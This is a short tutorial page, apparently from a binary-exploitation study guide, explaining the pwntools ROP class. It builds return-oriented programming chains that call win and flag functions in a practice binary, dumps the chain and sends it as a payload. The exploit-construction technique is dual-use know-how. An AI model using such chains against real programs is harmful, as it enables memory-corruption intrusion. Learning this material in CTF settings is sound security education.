# ROP

The `ROP` class is insanely powerful, enabling you to create readable ropchains in many less lines.

## Creating a ROP object

```python
rop = ROP(elf)
```

## Adding Padding

```python
rop.raw('A' * 64)
```

## Adding a Packed Value

```python
rop.raw(0x12345678)
```

## Calling the Function win\(\)

```python
rop.win()
```

And if you need parameters:

```python
rop.win(0xdeadc0de, 0xdeadbeef)
```

## Dumping the Logic

```python
from pwn import *

elf = context.binary = ELF('./showcase')
rop = ROP(elf)

rop.win1(0x12345678)
rop.win2(0xdeadbeef, 0xdeadc0de)
rop.flag(0xc0ded00d)

print(rop.dump())
```

`dump()` output:

```text
0x0000:         0x40118b pop rdi; ret
0x0008:       0x12345678 [arg0] rdi = 305419896
0x0010:         0x401102 win1
0x0018:         0x40118b pop rdi; ret
0x0020:       0xdeadbeef [arg0] rdi = 3735928559
0x0028:         0x401189 pop rsi; pop r15; ret
0x0030:       0xdeadc0de [arg1] rsi = 3735929054
0x0038:       'oaaapaaa' <pad r15>
0x0040:         0x40110c win2
0x0048:         0x40118b pop rdi; ret
0x0050:       0xc0ded00d [arg0] rdi = 3235827725
0x0058:         0x401119 flag
```

## Sending the Chain

```python
p.sendline(rop.chain())
```

## Showcase

Without pwntools:

```python
payload = flat(
    POP_RDI,
    0xdeadc0de,
    elf.sym['win1'],
    POP_RDI,
    0xdeadbeef,
    POP_RSI,
    0x98765432,
    elf.sym['win2'],
    POP_RDI,
    0x54545454,
    elf.sym['flag']
)

p.sendline(payload)
```

With pwntools:

```python
rop.win1(0xdeadc0de)
rop.win2(0xdeadbeef, 0x98765432)
rop.flag(0x54545454)

p.sendline(rop.chain())
```

